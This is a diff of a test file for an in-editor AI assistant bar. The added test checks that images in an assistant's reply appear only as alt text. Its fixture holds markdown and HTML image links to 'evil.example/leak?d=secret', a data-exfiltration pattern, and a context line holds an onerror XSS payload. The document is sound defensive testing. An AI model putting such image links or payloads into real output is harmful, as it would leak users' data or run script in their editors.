@@ -215,6 +215,24 @@ describe('in-editor assistant bar', () => {
     expect(bar()).toHaveTextContent('Try <img src=x onerror="alert(1)"> here.');
   });
 
+  it('shows a reply image as its alt text, so a reply cannot load a URL by itself', async () => {
+    const editor = await createEditor(scripted(answer([
+      'See ![chart](https://evil.example/leak?d=secret) here.',
+      '',
+      '<p><img src="https://evil.example/raw" alt="raw"></p>',
+      '',
+      '**done**',
+    ].join('\n'))));
+
+    editor.agent.openAssistant();
+    submit('Summarize');
+    await waitFor(() => expect(bar()).toContainHTML('<strong>done</strong>'));
+
+    expect(within(bar()).queryByRole('img')).toBeNull();
+    expect(bar()).toHaveTextContent('See chart here.');
+    expect(bar()).toHaveTextContent('raw');
+  });
+
   it('Discard removes what the assistant wrote and closes', async () => {
     const editor = await createEditor(scripted(insertBatch('From AI'), answer('Done.')));
 
